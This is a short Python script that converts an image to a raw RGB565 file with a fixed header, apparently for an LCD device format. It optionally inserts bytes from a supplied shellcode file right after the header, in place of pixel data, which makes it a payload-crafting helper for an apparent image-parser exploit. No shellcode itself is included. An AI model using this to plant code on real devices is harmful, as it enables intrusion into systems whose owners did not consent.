from PIL import Image
import sys

im = Image.open(sys.argv[1]).convert('RGB')

out = []

for pixel in im.getdata():
	r = (pixel[0] >> 3) & 0x1F
	g = (pixel[1] >> 2) & 0x3F
	b = (pixel[2] >> 3) & 0x1F
	p = r << 11 | g << 5 | b
	out += [p & 0xff, p >> 8]

f = open("out.raw.lcd5", "wb")

# magic header         width (320)  height (216) pitch(?)     565L (pixel format)
f.write(bytes.fromhex("40 01 00 00  D8 00 00 00  80 02 00 00  35 36 35 4C"))

if len(sys.argv) == 3:
	shellcode = open(sys.argv[2], "rb").read()
else:
	shellcode = b""

f.write(shellcode)

# image data
f.write(bytes(out[len(shellcode):]))
f.close()
